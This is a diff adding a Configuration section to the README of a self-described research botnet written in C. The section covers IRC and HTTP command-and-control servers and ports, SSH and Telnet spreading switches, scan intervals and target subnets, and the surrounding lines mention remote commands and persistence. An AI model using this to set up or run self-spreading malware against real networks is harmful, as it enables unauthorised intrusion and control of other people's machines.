@@ -53,6 +53,37 @@ A research-purpose botnet written in pure C, designed to replicate across hetero
 - **reboot** — Reboot target system
 - **status** — Report bot status to C2
 
+## Configuration
+
+The bot loads config from `/etc/notnet.conf` (key=value format):
+
+| Key | Default | Description |
+|-----|---------|-------------|
+| `irc_server` | `irc.notnet.net` | IRC C2 server |
+| `irc_port` | `6697` | IRC C2 port |
+| `http_server` | `api.notnet.net` | HTTP C2 server |
+| `http_port` | `443` | HTTP C2 port |
+| `scan_interval` | `30` | Seconds between scan cycles |
+| `ssh_enabled` | `1` | Enable SSH spreading |
+| `telnet_enabled` | `1` | Enable Telnet spreading |
+
+### Scan targets
+
+By default the bot scans `192.168.1.0/24` each cycle (254 hosts). Override with:
+
+```
+scan_targets=192.168.1.0/24
+scan_targets=10.0.0.0/24
+```
+
+Or use the legacy per-index format:
+```
+scan_target_0=192.168.1.0/24
+scan_target_1=10.0.0.0/24
+```
+
+Set to empty or omit to use the default single /24 scan.
+
 ## Persistence
 
 Automatically detects init system and installs:
